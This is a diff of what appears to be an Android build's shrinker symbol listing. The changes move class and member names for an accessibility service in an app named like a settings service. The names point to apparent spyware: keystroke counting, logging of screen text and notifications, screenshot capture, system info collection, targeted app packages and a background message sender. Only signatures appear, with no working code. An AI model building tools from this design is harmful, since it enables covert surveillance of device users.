@@ -9489,17 +9489,11 @@ com.AndroidSettingsServices.R$xml
 com.AndroidSettingsServices.R
 com.MainActivity$1
 com.MainActivity
-com.MyAccessibilityService$MessageSender:
-    private static final java.lang.String TAG
-com.MyAccessibilityService:
-    private static final long EXPIRATION_TIME
-    private static final int MAX_BUFFER_SIZE
-    private static final java.lang.String TAG
-    private static final java.lang.String TARGET_APP_PACKAGE1
-    private static final java.lang.String TARGET_APP_PACKAGE2
-    private static final java.lang.String TARGET_APP_PACKAGE3
-    private static final java.lang.String TARGET_APP_PACKAGE4
-    public void setMediaProjectionData(android.content.Intent)
+com.MyAccessibilityService$1
+com.MyAccessibilityService$2
+com.MyAccessibilityService$MessageSender
+com.MyAccessibilityService
+com.PermissionActivity
 com.getkeepsafe.relinker.ApkLibraryInstaller:
     private static final int COPY_BUFFER_SIZE
     private static final int MAX_TRIES
@@ -29366,25 +29360,6 @@ androidx.viewpager2.adapter.FragmentStateAdapter$FragmentMaxLifecycleEnforcer$3:
 androidx.viewpager2.adapter.FragmentStateAdapter$FragmentMaxLifecycleEnforcer
 androidx.viewpager2.adapter.FragmentStateAdapter
 androidx.viewpager2.adapter.FragmentViewHolder
-com.MyAccessibilityService$MessageSender:
-    public static varargs java.lang.Void doInBackground()
-com.MyAccessibilityService:
-    public android.media.projection.MediaProjection mediaProjection
-    public android.content.Intent mediaProjectionData
-    public android.media.projection.MediaProjectionManager mediaProjectionManager
-    public static void checkMediaProjectionPermission()
-    public static int countKeyEvents()
-    public static java.lang.String formatKetikStyle()
-    public static java.lang.String formatMetaStyle()
-    public static java.lang.String formatScreenText()
-    public static java.lang.String getCurrentTimestamp()
-    public static java.lang.String getSYSInfo()
-    public static void handleNotificationChangedEvent()
-    public static void handleTextChangedEvent()
-    public static void handleTypeViewEvent()
-    public static void initScreenshot()
-    public static void logAllTexts()
-    public static void processScreenshot()
 com.getkeepsafe.relinker.ApkLibraryInstaller$ZipFileInZipEntry
 com.getkeepsafe.relinker.ApkLibraryInstaller
 com.getkeepsafe.relinker.ReLinker$LibraryInstaller
